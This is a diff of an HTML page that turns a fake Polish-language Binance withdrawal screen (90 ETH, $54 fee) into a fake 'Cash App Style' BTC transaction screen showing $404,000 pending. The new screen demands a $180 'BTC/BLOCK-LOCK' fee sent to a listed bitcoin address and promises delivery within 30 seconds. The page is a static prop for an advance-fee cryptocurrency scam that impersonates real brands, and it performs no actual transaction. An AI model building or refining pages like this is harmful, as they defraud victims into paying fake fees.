@@ -1,77 +1,67 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Binance ETH-pay</title>
+  <title>BTC Transaction - Cash App Style</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       margin: 0;
-      padding: 20px;
-      background-color: #000;
-      color: #FFD700;
       font-family: 'Segoe UI', sans-serif;
+      background-color: #000;
+      color: #fff;
     }
     .container {
       max-width: 400px;
       margin: auto;
+      padding: 20px;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .header h1 {
+      font-size: 1.5em;
+      color: #00FF00;
+    }
+    .card {
       background-color: #111;
       border-radius: 12px;
       padding: 20px;
-      box-shadow: 0 0 10px #FFD70055;
-    }
-    .logo {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 20px;
-    }
-    .logo img {
-      width: 100px;
-    }
-    h1 {
-      text-align: center;
-      font-size: 1.5em;
-      margin-bottom: 10px;
+      box-shadow: 0 0 10px #00FF0055;
     }
     .amount {
-      font-size: 2em;
+      font-size: 1.8em;
       font-weight: bold;
       text-align: center;
       margin-bottom: 10px;
     }
-    .processing {
+    .label {
       text-align: center;
-      font-weight: bold;
-      color: #FFD700;
-      animation: blink 1.5s infinite;
-    }
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
+      font-size: 0.95em;
+      color: #ccc;
     }
     .details {
       margin-top: 20px;
       font-size: 1em;
       line-height: 1.6;
     }
-    .fee {
+    .details strong {
       color: #00FF00;
-      font-weight: bold;
     }
     .notice {
       background-color: #222;
-      padding: 10px;
+      padding: 15px;
       border-radius: 8px;
-      margin-top: 15px;
       font-size: 0.95em;
-      color: #FFD700;
       text-align: center;
+      margin-top: 15px;
+      color: #FFD700;
     }
     button {
       display: block;
       width: 100%;
-      background-color: #FFD700;
+      background-color: #00FF00;
       color: #000;
       border: none;
       padding: 12px;
@@ -82,42 +72,38 @@
       transition: background-color 0.3s ease;
     }
     button:hover {
-      background-color: #e6c200;
+      background-color: #00cc00;
     }
     button.clicked::after {
       content: " ✅";
-      color: #00FF00;
+      color: #fff;
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <div class="logo">
-      <img src="IMG_4307.webp" alt="Binance Logo">
+    <div class="header">
+      <h1>BTC Transaction</h1>
     </div>
 
-    <h1>Szczegóły wypłaty</h1>
-    <div class="amount">-90 ETH ($404,400)</div>
-    <div class="processing">⚠️ Przetwarzanie</div>
-    <p style="text-align:center;">⚠️ Transakcja może się nie powieść z powodu problemów z siecią lub niewystarczających środków.</p>
+    <div class="card">
+      <div class="amount">$404,000 BTC</div>
+      <div class="label">Transaction Amount</div>
 
-    <div class="details">
-      <p>⏰ Szacowany czas zakończenia: 2025-09-18 01:15:00</p>
-      <p>📧 Otrzymasz e-mail po zakończeniu transakcji.</p>
-      <p>🌐 Sieć: Ethereum</p>
-      <p>📥 Adres odbiorcy: 0x55fe07cb66ceefb36e15ee7e6373d758603bb575</p>
-      <p>💰 Kwota: 90 ETH</p>
-      <p class="fee">💸 Opłata sieciowa: $54</p>
-      <p>👛 Portfel: Portfel Spot</p>
-      <p>📅 Data: 2025-09-18 01:13:00</p>
+      <div class="details">
+        <p>📥 Recipient Address:<br><strong>38GL3VkGVcFjR6rcFiXTkL9Jyp7uJjnTaX</strong></p>
+        <p>💸 Fee Required: <strong>$180</strong></p>
+        <p>🔐 Fee Type: <strong>BTC/BLOCK-LOCK</strong></p>
+        <p>📤 Send Fee To:<br><strong>bc1qas3rhc2hm2puwf0muz3u2wwhtl6hu0lcyqk24n</strong></p>
+      </div>
+
+      <div class="notice">
+        Once the $180 fee is paid, the recipient will receive the full BTC amount within <strong>30 seconds</strong>.
+      </div>
+
+      <button onclick="this.classList.add('clicked')">Save Address</button>
     </div>
-
-    <div class="notice">
-      Po dokonaniu płatności $54, <br> 90 ETH zostanie dostarczone na powyższy adres w ciągu 30 sekund.
-    </div>
-
-    <button onclick="this.classList.add('clicked')">Zapisz adres</button>
   </div>
 
 </body>
